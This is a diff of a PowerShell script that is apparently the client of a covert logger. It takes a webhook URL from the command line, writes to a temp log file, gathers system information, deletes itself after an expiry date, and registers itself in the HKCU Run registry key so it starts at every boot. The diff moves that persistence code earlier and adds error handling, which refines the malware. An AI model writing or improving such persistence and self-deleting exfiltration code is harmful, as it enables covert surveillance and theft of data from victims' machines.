@@ -1,11 +1,21 @@
+param (
+    [string]$webhookURL,     # Webhook URL passed via command line
+    [string]$expiryDateParam # Expiry date passed via command line (optional)
+)
+
 # Ensure that the webhook URL is set directly from the command line
-$webhookURL = $dc  # $dc is the variable passed via the command line
+$webhookURL = $webhookURL  # $webhookURL is the variable passed via the command line
 
 # Define the path to the temp log file
 $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
 
-# Define the expiry date passed as an argument (in 'yyyy-MM-dd' format)
-$expiryDate = [datetime]::ParseExact($args[0], 'yyyy-MM-dd', $null)  # Expiry date passed in 'yyyy-MM-dd' format
+# Set the default expiry date to 30 days from today if no expiry date is passed
+if (-not $expiryDateParam) {
+    $expiryDate = (Get-Date).AddDays(30)
+} else {
+    # Parse the expiry date passed in 'yyyy-MM-dd' format
+    $expiryDate = [datetime]::ParseExact($expiryDateParam, 'yyyy-MM-dd', $null)
+}
 
 # Check if the script has expired
 $currentDate = Get-Date
@@ -14,6 +24,35 @@ if ($currentDate -gt $expiryDate) {
     Write-Host "Script has expired. Deleting script file..."
     Remove-Item $MyInvocation.MyCommand.Path -Force
     exit
+}
+
+# Add this script to startup to ensure it runs every time the system boots
+$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$scriptName = "MyStartupScript"  # You can change this name if you like
+
+# Check if the script is already added to startup to avoid duplicates
+$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
+if ($existingEntry) {
+    Write-Host "Script is already added to startup." -ForegroundColor Yellow
+} else {
+    # Add the script to startup
+    try {
+        Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
+        Write-Host "Script added to startup." -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Error adding script to startup:" -ForegroundColor Red
+        Write-Host $_.Exception.Message
+    }
+
+    # Confirm that the entry has been added to the registry
+    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
+    if ($confirmation) {
+        Write-Host "Script successfully added to startup." -ForegroundColor Green
+    } else {
+        Write-Host "Failed to add script to startup." -ForegroundColor Red
+    }
 }
 
 # Get additional system info
@@ -68,19 +107,4 @@ while ($true) {
     else {
         Write-Host "Temp file not found at path: $tempFilePath" -ForegroundColor Yellow
     }
-}
-
-# Add this script to startup to ensure it runs every time the system boots
-$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
-$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "MyStartupScript"  # You can change this name if you like
-
-# Check if the script is already added to startup to avoid duplicates
-$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
-if ($existingEntry) {
-    Write-Host "Script is already added to startup."
-} else {
-    # Add the script to startup
-    Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
-    Write-Host "Script added to startup."
 }
